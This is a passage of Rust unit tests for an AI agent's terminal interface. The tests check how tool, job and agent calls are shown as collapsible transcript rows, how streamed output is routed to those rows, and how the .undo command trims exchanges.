        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b" turn\n".to_vec(),
        });
        assert_eq!(harness.app.transcript.len(), 2);
        harness.app.end_turn(true, &TurnOutcome::default());
        let cells_after_first = harness.app.transcript.len();

        harness.app.begin_turn(".run", true);
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"second turn\n".to_vec(),
        });
        assert_eq!(harness.app.transcript.len(), cells_after_first + 2);
        assert!(matches!(
            harness.app.transcript.cells().last(),
            Some(Cell::Text { call_id: None, lines, .. }) if lines == &["second turn"]
        ));
        assert!(matches!(
            &harness.app.transcript.cells()[1],
            Cell::Text { lines, .. } if lines == &["first turn"]
        ));
    }

    fn ctrl(code: KeyCode) -> KeyEvent {
        KeyEvent::new(code, KeyModifiers::CONTROL)
    }

    fn narrate(harness: &mut Harness, call_id: &str, line: &str) {
        harness.app.handle_msg(UiMsg::ToolNarration {
            call_id: call_id.to_string(),
            line: line.to_string(),
        });
    }

    /// Sends what the sink sends for a tool's start hook: the status
    /// row's name first, then the row's own message.
    fn start_tool(harness: &mut Harness, call_id: &str, name: &str, args: Option<Value>) {
        harness
            .app
            .handle_msg(UiMsg::ToolRunning(Some(name.to_string())));
        harness.app.handle_msg(UiMsg::ToolStarted {
            call_id: call_id.to_string(),
            name: name.to_string(),
            args,
        });
    }

    fn tool_output(harness: &mut Harness, call_id: &str, bytes: &str) {
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: Some(call_id.to_string()),
            bytes: bytes.as_bytes().to_vec(),
        });
    }

    fn finish_tool(harness: &mut Harness, call_id: &str, ok: bool, error: Option<&str>) {
        harness.app.handle_msg(UiMsg::ToolRunning(None));
        harness.app.handle_msg(UiMsg::ToolFinished {
            call_id: call_id.to_string(),
            ok,
            error: error.map(str::to_string),
            duration_ms: Some(1200),
        });
    }

    /// A turn with one `fs_read` call under way: narrated, started and
    /// two chunks of output in.
    fn running_fs_read(harness: &mut Harness) {
        harness.app.begin_turn("read it", false);
        narrate(harness, "call-1", "Call fs_read {\"path\":\"src/main.rs\"}");
        start_tool(harness, "call-1", "fs_read", None);
        tool_output(harness, "call-1", "fn main() {\n");
        tool_output(harness, "call-1", "    println!(\"hi\");\n}\n");
    }

    fn todo_items() -> Vec<crate::config::todo::TodoItem> {
        use crate::config::todo::TodoItem;
        vec![
            TodoItem {
                id: 1,
                desc: "wire the panel".to_string(),
                done: true,
            },
            TodoItem {
                id: 2,
                desc: "snapshot it narrow".to_string(),
                done: false,
            },
        ]
    }

    /// The first screen row of the last frame that starts with `prefix`.
    fn screen_row(harness: &Harness, prefix: &str) -> u16 {
        let buffer = harness.terminal.backend().buffer();
        for y in 0..buffer.area.height {
            let text: String = (0..buffer.area.width)
                .map(|x| buffer[(x, y)].symbol())
                .collect();
            if text.starts_with(prefix) {
                return y;
            }
        }
        panic!("no row starts with {prefix:?}:\n{buffer:?}");
    }

    /// The modifiers on the first cell of the first screen row that
    /// starts with `prefix`.
    fn row_modifier(harness: &Harness, prefix: &str) -> Modifier {
        let row = screen_row(harness, prefix);
        harness.terminal.backend().buffer()[(0, row)].modifier
    }

    #[test]
    fn a_running_tool_row_shows_its_output_tail() {
        let mut harness = Harness::standalone(80, 24);
        running_fs_read(&mut harness);
        let frame = harness.draw();
        insta::assert_snapshot!("tool_running_80x24", &frame);
        assert!(frame.contains("fs_read({\"path\":\"src/main.rs\"})  running"));
        assert!(
            frame.contains("Call fs_read {\"path\":\"src/main.rs\"}"),
            "{frame}"
        );
        assert!(frame.contains("println!(\"hi\");"));
    }

    /// The start hook's compact JSON and the narration's text after the
    /// name are the same arguments, so the header reads the same from
    /// either.
    #[test]
    fn the_hooks_arguments_render_the_same_header_as_the_narration() {
        let mut from_narration = Harness::standalone(80, 24);
        running_fs_read(&mut from_narration);
        let mut from_hook = Harness::standalone(80, 24);
        from_hook.app.begin_turn("read it", false);
        narrate(
            &mut from_hook,
            "call-1",
            "Call fs_read {\"path\":\"src/main.rs\"}",
        );
        start_tool(
            &mut from_hook,
            "call-1",
            "fs_read",
            Some(serde_json::json!({"path": "src/main.rs"})),
        );
        tool_output(&mut from_hook, "call-1", "fn main() {\n");
        tool_output(&mut from_hook, "call-1", "    println!(\"hi\");\n}\n");
        let header = |harness: &mut Harness| {
            let frame = harness.draw();
            let row = screen_row(harness, "fs_read(");
            frame.lines().nth(usize::from(row)).unwrap().to_string()
        };
        let expected = header(&mut from_narration);
        assert!(expected.contains("fs_read({\"path\":\"src/main.rs\"})  running"));
        assert_eq!(header(&mut from_hook), expected);
    }

    #[test]
    fn a_finished_tool_row_collapses_and_opens_from_the_keyboard() {
        let mut harness = Harness::standalone(80, 24);
        running_fs_read(&mut harness);
        finish_tool(&mut harness, "call-1", true, None);
        harness.app.end_turn(false, &TurnOutcome::default());
        let frame = harness.draw();
        insta::assert_snapshot!("tool_collapsed_ok_80x24", &frame);
        assert!(frame.contains("1.2s  ok"), "{frame}");
        assert!(!frame.contains("fn main()"), "{frame}");
        assert!(!frame.contains("Call fs_read"), "{frame}");

        assert!(harness.app.handle_key(ctrl(KeyCode::Up)).is_none());
        assert!(harness.app.transcript.focused());
        assert!(harness.press(KeyCode::Enter).is_none());
        let frame = harness.draw();
        insta::assert_snapshot!("tool_expanded_80x24", &frame);
        assert!(frame.contains("fn main()"), "{frame}");
        assert!(
            frame.contains("Call fs_read {\"path\":\"src/main.rs\"}"),
            "{frame}"
        );
        assert!(
            row_modifier(&harness, "fs_read(").contains(Modifier::REVERSED),
            "the focused header is not reversed"
        );
    }

    #[test]
    fn a_failed_tool_row_shows_the_first_error_line_until_opened() {
        let mut harness = Harness::standalone(80, 24);
        running_fs_read(&mut harness);
        finish_tool(
            &mut harness,
            "call-1",
            false,
            Some("exit 2\nno such file: src/main.rs"),
        );
        harness.app.end_turn(false, &TurnOutcome::default());
        let frame = harness.draw();
        insta::assert_snapshot!("tool_failed_80x24", &frame);
        assert!(frame.contains("1.2s  failed: exit 2"), "{frame}");
        assert!(!frame.contains("no such file"), "{frame}");

        harness.app.handle_key(ctrl(KeyCode::Up));
        harness.press(KeyCode::Enter);
        let frame = harness.draw();
        assert!(frame.contains("no such file: src/main.rs"), "{frame}");
        assert!(frame.contains("fn main()"), "{frame}");
    }

    /// A folded header wider than the row gives up arguments, not its
    /// state: at 40 columns a 48-character argument string is cut to
    /// what leaves `failed: exit 2` on screen.
    #[test]
    fn a_narrow_folded_header_keeps_its_state_and_cuts_the_arguments() {
        let mut harness = Harness::standalone(40, 20);
        harness.app.begin_turn("read it", false);
        let path = format!("src/{}.rs", "x".repeat(30));
        let args = serde_json::json!({ "path": path }).to_string();
        assert_eq!(args.chars().count(), 48);
        narrate(&mut harness, "call-1", &format!("Call fs_read {args}"));
        start_tool(&mut harness, "call-1", "fs_read", None);
        finish_tool(
            &mut harness,
            "call-1",
            false,
            Some("exit 2\nno such file: src/main.rs"),
        );
        harness.app.end_turn(false, &TurnOutcome::default());
        let frame = harness.draw();
        insta::assert_snapshot!("tool_failed_40x20", &frame);
        assert!(frame.contains("1.2s  failed: exit 2"), "{frame}");
        assert!(frame.contains("fs_read({\"path...)  1.2s"), "{frame}");
    }

    #[test]
    fn a_job_takes_its_start_calls_row_and_folds_the_checks_in() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("build it", false);
        narrate(
            &mut harness,
            "call-1",
            "Call job__start {\"tool\":\"execute_command\"}",
        );
        start_tool(&mut harness, "call-1", "job__start", None);
        harness.app.handle_msg(UiMsg::JobStarted {
            job_id: "job_1a2b3c4d".to_string(),
            tool: "execute_command".to_string(),
        });
        tool_output(&mut harness, "call-1", "started\n");
        finish_tool(&mut harness, "call-1", true, None);
        narrate(
            &mut harness,
            "call-2",
            "Call job__check {\"id\":\"job_1a2b3c4d\"}",
        );
        start_tool(
            &mut harness,
            "call-2",
            "job__check",
            Some(serde_json::json!({"id": "job_1a2b3c4d"})),
        );
        tool_output(&mut harness, "call-2", "still running\n");
        finish_tool(&mut harness, "call-2", true, None);
        harness.app.handle_msg(UiMsg::JobFinished {
            job_id: "job_1a2b3c4d".to_string(),
            ok: true,
            error: None,
        });
        harness.app.end_turn(false, &TurnOutcome::default());

        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 2, "one user cell and one job row");
        let Cell::Job { status, calls, .. } = &cells[1] else {
            panic!("the job did not take the start call's row");
        };
        assert_eq!(*status, JobStatus::Done);
        let names: Vec<&str> = calls.iter().map(|call| call.name.as_str()).collect();
        assert_eq!(names, ["job__start", "job__check"]);
        assert_eq!(calls[0].output, ["started"]);
        assert_eq!(calls[1].output, ["still running"]);

        let frame = harness.draw();
        insta::assert_snapshot!("job_row_80x24", &frame);
        assert!(
            frame.contains("job execute_command job_1a2b3c4d  done  started, checked"),
            "{frame}"
        );
        assert!(!frame.contains("still running"), "{frame}");
        harness.app.handle_key(ctrl(KeyCode::Down));
        harness.press(KeyCode::Enter);
        let frame = harness.draw();
        assert!(frame.contains("still running"), "{frame}");
    }

    /// A check on a job from a later turn folds into the job's row, and
    /// its output goes with it rather than into a loose text cell.
    #[test]
    fn a_later_turns_check_on_a_job_lands_on_the_jobs_row() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("build it", false);
        narrate(
            &mut harness,
            "call-1",
            "Call job__start {\"tool\":\"execute_command\"}",
        );
        start_tool(&mut harness, "call-1", "job__start", None);
        harness.app.handle_msg(UiMsg::JobStarted {
            job_id: "job_1a2b3c4d".to_string(),
            tool: "execute_command".to_string(),
        });
        finish_tool(&mut harness, "call-1", true, None);
        harness
            .app
            .handle_msg(UiMsg::AssistantText("Started it.".to_string()));
        harness.app.end_turn(false, &TurnOutcome::default());
        assert_eq!(harness.app.transcript.len(), 3);

        harness.app.begin_turn("how is it going", false);
        narrate(
            &mut harness,
            "call-2",
            "Call job__check {\"id\":\"job_1a2b3c4d\"}",
        );
        start_tool(
            &mut harness,
            "call-2",
            "job__check",
            Some(serde_json::json!({"id": "job_1a2b3c4d"})),
        );
        tool_output(&mut harness, "call-2", "still running\n");
        finish_tool(&mut harness, "call-2", true, None);
        harness.app.end_turn(false, &TurnOutcome::default());

        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 4, "the check added only its user line");
        let Cell::Job { calls, .. } = &cells[1] else {
            panic!("the job row moved");
        };
        assert_eq!(calls.len(), 2);
        assert_eq!(calls[1].name, "job__check");
        assert_eq!(calls[1].output, ["still running"]);
        assert!(matches!(&cells[3], Cell::User { .. }));
    }

    /// A tool row still running when its turn ends (interrupted, or the
    /// task died under it) is marked failed rather than left spinning;
    /// a job row, whose work goes on, is not.
    #[test]
    fn a_turn_ending_fails_its_unreported_tool_rows_and_spares_jobs() {
        let mut harness = Harness::standalone(80, 24);
        running_fs_read(&mut harness);
        harness.app.handle_msg(UiMsg::JobStarted {
            job_id: "job_1a2b3c4d".to_string(),
            tool: "execute_command".to_string(),
        });
        harness.clock.advance(Duration::from_secs(3));
        harness.app.end_turn(
            false,
            &TurnOutcome {
                error: Some("interrupted".to_string()),
                ..TurnOutcome::default()
            },
        );
        let cells = harness.app.transcript.cells();
        assert!(matches!(
            &cells[1],
            Cell::Tool {
                status: ToolStatus::Failed { elapsed, error },
                ..
            } if error == "interrupted" && *elapsed == Duration::from_secs(3)
        ));
        assert!(matches!(
            &cells[2],
            Cell::Job {
                status: JobStatus::Running,
                ..
            }
        ));
        let frame = harness.draw();
        assert!(frame.contains("3.0s  failed: interrupted"), "{frame}");
    }

    /// The loop drains the channel before `end_turn`, the way the Work arm
    /// does, so a report that lost the select to the join still lands
    /// ahead of the sweep.
    #[test]
    fn a_tool_report_queued_before_the_turn_ends_beats_the_sweep() {
        let mut harness = Harness::standalone(80, 24);
        running_fs_read(&mut harness);
        let (tx, mut rx) = unbounded_channel();
        tx.send(UiMsg::ToolFinished {
            call_id: "call-1".to_string(),
            ok: true,
            error: None,
            duration_ms: Some(1200),
        })
        .unwrap();
        while let Ok(msg) = rx.try_recv() {
            harness.app.handle_msg(msg);
        }
        harness.app.end_turn(false, &TurnOutcome::default());
        assert!(matches!(
            &harness.app.transcript.cells()[1],
            Cell::Tool {
                status: ToolStatus::Ok { elapsed },
                ..
            } if *elapsed == Duration::from_millis(1200)
        ));
    }

    #[test]
    fn an_agent_takes_its_spawn_calls_row_and_folds_the_collect_in() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("delegate it", false);
        narrate(
            &mut harness,
            "call-1",
            "Call agent__spawn {\"agent\":\"coder\"}",
        );
        start_tool(&mut harness, "call-1", "agent__spawn", None);
        harness.app.handle_msg(UiMsg::AgentStarted {
            agent_id: "agent_coder_1a2b3c4d".to_string(),
            name: "coder".to_string(),
        });
        finish_tool(&mut harness, "call-1", true, None);
        narrate(
            &mut harness,
            "call-2",
            "Call agent__collect {\"id\":\"agent_coder_1a2b3c4d\"}",
        );
        start_tool(
            &mut harness,
            "call-2",
            "agent__collect",
            Some(serde_json::json!({"id": "agent_coder_1a2b3c4d"})),
        );
        finish_tool(&mut harness, "call-2", true, None);
        harness.app.handle_msg(UiMsg::AgentFinished {
            agent_id: "agent_coder_1a2b3c4d".to_string(),
            outcome: AgentOutcome::Completed,
        });
        harness.app.end_turn(false, &TurnOutcome::default());

        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 2, "one user cell and one agent row");
        let Cell::Agent { status, calls, .. } = &cells[1] else {
            panic!("the agent did not take the spawn call's row");
        };
        assert_eq!(*status, AgentStatus::Completed);
        let names: Vec<&str> = calls.iter().map(|call| call.name.as_str()).collect();
        assert_eq!(names, ["agent__spawn", "agent__collect"]);

        let frame = harness.draw();
        insta::assert_snapshot!("agent_row_80x24", &frame);
        assert!(
            frame.contains("agent coder agent_coder_1a2b3c4d  completed  spawned, collected"),
            "{frame}"
        );
    }

    #[test]
    fn a_bookkeeping_call_is_one_dim_line_that_never_takes_the_focus() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("remember", false);
        narrate(
            &mut harness,
            "call-1",
            "Call memory__search {\"query\":\"tui\"}",
        );
        start_tool(&mut harness, "call-1", "memory__search", None);
        tool_output(&mut harness, "call-1", "3 hits\n");
        let frame = harness.draw();
        assert!(
            !frame.contains("3 hits"),
            "a running bookkeeping call showed output:\n{frame}"
        );
        finish_tool(&mut harness, "call-1", true, None);
        harness.app.end_turn(false, &TurnOutcome::default());
        let frame = harness.draw();
        insta::assert_snapshot!("bookkeeping_line_80x24", &frame);
        assert!(
            frame.contains("memory__search({\"query\":\"tui\"})  1.2s  ok"),
            "{frame}"
        );
        assert!(!frame.contains("3 hits"), "{frame}");

        harness.app.handle_key(ctrl(KeyCode::Up));
        assert!(!harness.app.transcript.focused());
        harness.press(KeyCode::Enter);
        let frame = harness.draw();
        assert!(!frame.contains("3 hits"), "{frame}");
    }

    #[test]
    fn a_todo_call_leaves_no_row_in_the_transcript() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("plan it", false);
        let before = harness.app.transcript.len();
        narrate(&mut harness, "call-1", "Call todo__list {}");
        start_tool(&mut harness, "call-1", "todo__list", None);
        finish_tool(&mut harness, "call-1", true, None);
        assert_eq!(harness.app.transcript.len(), before);
        assert!(!harness.draw().contains("todo__list"));
    }

    #[test]
    fn tool_output_routes_by_call_id_past_newer_rows() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("two reads", false);
        narrate(&mut harness, "call-1", "Call fs_read {\"path\":\"a\"}");
        start_tool(&mut harness, "call-1", "fs_read", None);
        narrate(&mut harness, "call-2", "Call fs_read {\"path\":\"b\"}");
        start_tool(&mut harness, "call-2", "fs_read", None);
        tool_output(&mut harness, "call-1", "from a\n");
        tool_output(&mut harness, "call-2", "from b\n");
        let cells = harness.app.transcript.cells();
        assert!(matches!(
            &cells[1],
            Cell::Tool { call_id, output, .. } if call_id == "call-1" && output == &["from a"]
        ));
        assert!(matches!(
            &cells[2],
            Cell::Tool { call_id, output, .. } if call_id == "call-2" && output == &["from b"]
        ));
    }

    /// A multi-byte character the pipe split across two reads renders
    /// whole; a lone byte no sequence can hold still shows as U+FFFD.
    #[test]
    fn tool_output_split_mid_character_decodes_whole() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("accents", false);
        narrate(
            &mut harness,
            "call-1",
            "Call execute_command {\"command\":\"menu\"}",
        );
        start_tool(&mut harness, "call-1", "execute_command", None);
        for chunk in [
            &b"caf"[..],
            &[0xC3][..],
            &[0xA9, b'\n'][..],
            &[0xFF, b'\n'][..],
        ] {
            harness.app.handle_msg(UiMsg::ToolOutput {
                call_id: Some("call-1".to_string()),
                bytes: chunk.to_vec(),
            });
        }
        let Some(Cell::Tool {
            output, pending, ..
        }) = harness.app.transcript.cells().get(1)
        else {
            panic!("the tool row is gone");
        };
        assert_eq!(output, &["caf\u{e9}", "\u{FFFD}"]);
        assert!(pending.is_empty());
    }

    /// A model that names no call id leaves the hooks with an empty one;
    /// it pairs with the newest running row that has none, and once that
    /// row finishes the next empty id finds the next row.
    #[test]
    fn an_empty_call_id_pairs_with_the_newest_running_anonymous_row() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("anonymous", false);
        narrate(&mut harness, "", "Call fs_read {\"path\":\"a\"}");
        start_tool(&mut harness, "", "fs_read", None);
        narrate(&mut harness, "", "Call fs_write {\"path\":\"b\"}");
        start_tool(&mut harness, "", "fs_write", None);
        finish_tool(&mut harness, "", false, Some("denied"));
        finish_tool(&mut harness, "", true, None);
        let cells = harness.app.transcript.cells();
        assert!(matches!(
            &cells[1],
            Cell::Tool { name, status: ToolStatus::Ok { .. }, .. } if name == "fs_read"
        ));
        assert!(matches!(
            &cells[2],
            Cell::Tool { name, status: ToolStatus::Failed { error, .. }, .. }
                if name == "fs_write" && error == "denied"
        ));
    }

    /// The output pump of a call without an id reports `None` rather
    /// than an empty id; the bytes still reach the newest running row
    /// without one, and a row that has finished takes no more of them.
    #[test]
    fn anonymous_tool_output_lands_in_the_newest_running_anonymous_row() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("anonymous", false);
        narrate(&mut harness, "", "Call fs_read {\"path\":\"a\"}");
        start_tool(&mut harness, "", "fs_read", None);
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"from read\n".to_vec(),
        });
        narrate(&mut harness, "", "Call fs_write {\"path\":\"b\"}");
        start_tool(&mut harness, "", "fs_write", None);
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"from write\n".to_vec(),
        });
        finish_tool(&mut harness, "", true, None);
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"late read\n".to_vec(),
        });
        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 3, "the output took no cell of its own");
        assert!(matches!(
            &cells[1],
            Cell::Tool { name, output, status: ToolStatus::Running { .. }, .. }
                if name == "fs_read" && output == &["from read", "late read"]
        ));
        assert!(matches!(
            &cells[2],
            Cell::Tool { name, output, status: ToolStatus::Ok { .. }, .. }
                if name == "fs_write" && output == &["from write"]
        ));
    }

    /// Once a call without an id has folded into the job row it started,
    /// its output follows it there.
    #[test]
    fn anonymous_tool_output_follows_its_call_into_a_job_row() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("background", false);
        narrate(
            &mut harness,
            "",
            "Call job__start {\"tool\":\"execute_command\"}",
        );
        start_tool(&mut harness, "", "job__start", None);
        harness.app.handle_msg(UiMsg::JobStarted {
            job_id: "job_1a2b3c4d".to_string(),
            tool: "execute_command".to_string(),
        });
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"started\n".to_vec(),
        });
        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 2, "the output took no cell of its own");
        let Cell::Job { calls, .. } = &cells[1] else {
            panic!("the job did not take the start call's row");
        };
        assert_eq!(calls[0].output, ["started"]);
    }

    /// Output without an id that arrives after the job has finished is
    /// not the job's: it takes a cell of its own rather than reopening
    /// the finished row.
    #[test]
    fn anonymous_tool_output_never_joins_a_finished_job_row() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("background", false);
        narrate(
            &mut harness,
            "",
            "Call job__start {\"tool\":\"execute_command\"}",
        );
        start_tool(&mut harness, "", "job__start", None);
        harness.app.handle_msg(UiMsg::JobStarted {
            job_id: "job_1a2b3c4d".to_string(),
            tool: "execute_command".to_string(),
        });
        harness.app.handle_msg(UiMsg::JobFinished {
            job_id: "job_1a2b3c4d".to_string(),
            ok: true,
            error: None,
        });
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"late\n".to_vec(),
        });
        let cells = harness.app.transcript.cells();
        let Cell::Job { calls, .. } = &cells[1] else {
            panic!("the job did not take the start call's row");
        };
        assert!(calls[0].output.is_empty(), "{:?}", calls[0].output);
        let Some(Cell::Text {
            call_id: None,
            lines,
            ..
        }) = cells.last()
        else {
            panic!("the late output took no cell of its own");
        };
        assert_eq!(lines, &["late"]);
    }

    #[test]
    fn an_end_for_an_unknown_job_or_agent_changes_nothing() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("background", false);
        harness.app.handle_msg(UiMsg::JobStarted {
            job_id: "job_1a2b3c4d".to_string(),
            tool: "execute_command".to_string(),
        });
        harness.app.handle_msg(UiMsg::AgentStarted {
            agent_id: "agent_coder_1a2b3c4d".to_string(),
            name: "coder".to_string(),
        });
        harness.app.handle_msg(UiMsg::JobFinished {
            job_id: "job_other".to_string(),
            ok: false,
            error: Some("boom".to_string()),
        });
        harness.app.handle_msg(UiMsg::AgentFinished {
            agent_id: "agent_other".to_string(),
            outcome: AgentOutcome::Failed("boom".to_string()),
        });
        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 3);
        assert!(matches!(
            &cells[1],
            Cell::Job {
                status: JobStatus::Running,
                ..
            }
        ));
        assert!(matches!(
            &cells[2],
            Cell::Agent {
                status: AgentStatus::Running,
                ..
            }
        ));

        harness.app.handle_msg(UiMsg::JobCancelled {
            job_id: "job_1a2b3c4d".to_string(),
        });
        assert!(matches!(
            &harness.app.transcript.cells()[1],
            Cell::Job {
                status: JobStatus::Cancelled,
                ..
            }
        ));
    }

    /// One exchange plus a tool call, for the undo cases.
    fn exchange(harness: &mut Harness) {
        harness.app.begin_turn("first question", false);
        narrate(harness, "call-1", "Call fs_read {\"path\":\"a\"}");
        finish_tool(harness, "call-1", true, None);
        harness
            .app
            .handle_msg(UiMsg::AssistantText("first answer".to_string()));
        harness.app.end_turn(false, &TurnOutcome::default());
    }

    #[test]
    fn a_successful_undo_takes_the_last_exchange_out_of_the_transcript() {
        let mut harness = Harness::standalone(80, 24);
        exchange(&mut harness);
        exchange(&mut harness);
        assert_eq!(harness.app.transcript.len(), 6);
        harness.app.handle_key(ctrl(KeyCode::Up));
        harness.app.begin_turn(".undo", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        let cells = harness.app.transcript.cells();
        assert_eq!(
            cells.len(),
            3,
            "the second exchange and the command cell are gone"
        );
        assert!(matches!(&cells[0], Cell::User { text, .. } if text == "first question"));
        assert!(matches!(&cells[2], Cell::Assistant { .. }));
        assert!(!harness.app.transcript.focused());
        let frame = harness.draw();
        assert!(!frame.contains(".undo"), "{frame}");
    }

    #[test]
    fn a_failed_undo_keeps_the_transcript_and_its_command_cell() {
        let mut harness = Harness::standalone(80, 24);
        exchange(&mut harness);
        harness.app.begin_turn(".undo", true);
        harness.app.end_turn(
            true,
            &TurnOutcome {
                error: Some("nothing to undo".to_string()),
                ..TurnOutcome::default()
            },
        );
        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 5);
        assert!(matches!(&cells[3], Cell::Command { name, .. } if name == ".undo"));
        assert!(matches!(&cells[4], Cell::Error { .. }));
    }

    #[test]
    fn an_undo_with_no_user_line_before_it_keeps_its_command_cell() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn(".info", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        harness.app.begin_turn(".undo", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 2);
        assert!(matches!(&cells[1], Cell::Command { name, .. } if name == ".undo"));
    }

    #[test]
    fn an_undo_after_a_file_command_stops_at_the_command_cell_that_opened_the_exchange() {
        let mut harness = Harness::standalone(80, 24);
        exchange(&mut harness);
        harness.app.begin_turn(".file notes.md -- summarize", true);
        harness
            .app
            .handle_msg(UiMsg::AssistantText("a summary".to_string()));
        harness.app.end_turn(true, &TurnOutcome::default());
        assert_eq!(harness.app.transcript.len(), 5);
        harness.app.begin_turn(".undo", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        let cells = harness.app.transcript.cells();
        assert_eq!(
            cells.len(),
            3,
            "the file exchange and the command cell are gone"
        );
        assert!(matches!(&cells[0], Cell::User { text, .. } if text == "first question"));
        assert!(matches!(&cells[2], Cell::Assistant { .. }));
    }

    /// Any answered command outside the modifying pair opened an
    /// exchange, whichever REPL arm handled it.
    #[test]
    fn an_undo_after_an_answered_starter_or_prompt_command_stops_at_that_command_cell() {
        for command in [".starter 1", ".prompt x y"] {
            let mut harness = Harness::standalone(80, 24);
            exchange(&mut harness);
            harness.app.begin_turn(command, true);
            harness
                .app
                .handle_msg(UiMsg::AssistantText("a reply".to_string()));
            harness.app.end_turn(true, &TurnOutcome::default());
            assert_eq!(harness.app.transcript.len(), 5);
            harness.app.begin_turn(".undo", true);
            harness.app.end_turn(true, &TurnOutcome::default());
            let cells = harness.app.transcript.cells();
            assert_eq!(cells.len(), 3, "{command}: the command's exchange is gone");
            assert!(matches!(&cells[0], Cell::User { text, .. } if text == "first question"));
            assert!(matches!(&cells[2], Cell::Assistant { .. }));
        }
    }

    #[test]
    fn an_undo_looks_past_a_command_that_opened_no_exchange() {
        let mut harness = Harness::standalone(80, 24);
        exchange(&mut harness);
        harness.app.begin_turn(".info", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        harness.app.begin_turn(".undo", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        assert!(harness.draw().contains("Tip: Press"));
    }

    /// A `.file` whose request reached the model and failed before any
    /// reply (the connection dropped, Esc before the first delta) left
    /// the session holding an exchange with an interrupted reply, so the
    /// `.undo` after it takes that exchange and not the one before.
    #[test]
    fn an_undo_after_a_file_command_whose_request_got_no_reply_stops_at_that_command_cell() {
        for began in [UiMsg::ThinkingStarted, UiMsg::StreamDone] {
            let mut harness = Harness::standalone(80, 24);
            exchange(&mut harness);
            harness.app.begin_turn(".file notes.md -- summarize", true);
            harness.app.handle_msg(began);
            harness.app.end_turn(
                true,
                &TurnOutcome {
                    error: Some("connection reset".to_string()),
                    ..TurnOutcome::default()
                },
            );
            assert_eq!(harness.app.transcript.len(), 5);
            assert!(matches!(
                &harness.app.transcript.cells()[3],
                Cell::Command { opened: true, .. }
            ));
            harness.app.begin_turn(".undo", true);
            harness.app.end_turn(true, &TurnOutcome::default());
            let cells = harness.app.transcript.cells();
            assert_eq!(cells.len(), 3, "the file command and its error are gone");
            assert!(matches!(&cells[0], Cell::User { text, .. } if text == "first question"));
            assert!(matches!(&cells[2], Cell::Assistant { .. }));
        }
    }

    /// A `.file` that bailed on usage opened nothing in the session, so
    /// the `.undo` after it takes back the exchange before it.
    #[test]
    fn an_undo_looks_past_a_file_command_that_bailed_before_a_reply() {
        let mut harness = Harness::standalone(80, 24);
        exchange(&mut harness);
        harness.app.begin_turn(".file", true);
        harness.app.end_turn(
            true,
            &TurnOutcome {
                error: Some("usage: .file <path>".to_string()),
                ..TurnOutcome::default()
            },
        );
        assert!(matches!(
            harness.app.transcript.cells().last(),
            Some(Cell::Error { .. })
        ));
        harness.app.begin_turn(".undo", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        assert!(harness.draw().contains("Tip: Press"));
    }

    /// A prompt whose turn failed before any request (no API key)
    /// recorded nothing in the session, so the `.undo` after it takes
    /// the exchange before it, and the transcript drops the failed line
    /// along with that exchange.
    #[test]
    fn an_undo_after_a_prompt_that_never_reached_the_model_takes_the_exchange_before_it() {
        let mut harness = Harness::standalone(80, 24);
        exchange(&mut harness);
        harness.app.begin_turn("second", false);
        harness.app.end_turn(
            false,
            &TurnOutcome {
                error: Some("no api key".to_string()),
                ..TurnOutcome::default()
            },
        );
        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 5);
        assert!(matches!(&cells[0], Cell::User { opened: true, .. }));
        assert!(matches!(&cells[3], Cell::User { opened: false, .. }));
        assert!(matches!(&cells[4], Cell::Error { .. }));
        harness.app.begin_turn(".undo", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        let frame = harness.draw();
        assert!(matches!(
            harness.app.transcript.cells(),
            [Cell::Welcome { .. }]
        ));
        assert!(frame.contains("Tip: Press"), "{frame}");
        assert!(!frame.contains("first question"), "{frame}");
    }

    /// `.regenerate` replaces the last reply inside the exchange it
    /// follows, so the `.undo` after it takes that whole exchange, user
    /// line included, as the session does.
    #[test]
    fn an_undo_after_a_regenerate_takes_the_original_exchange_too() {
        let mut harness = Harness::standalone(80, 24);
        exchange(&mut harness);
        harness.app.begin_turn(".regenerate", true);
        harness
            .app
            .handle_msg(UiMsg::AssistantText("second answer".to_string()));
        harness.app.end_turn(true, &TurnOutcome::default());
        assert_eq!(harness.app.transcript.len(), 5);
        harness.app.begin_turn(".undo", true);
        harness.app.end_turn(true, &TurnOutcome::default());
        let frame = harness.draw();
        assert!(frame.contains("Tip: Press"), "{frame}");
        assert!(!frame.contains("first question"), "{frame}");
    }

    /// Undoing the only exchange empties the transcript; the greeting
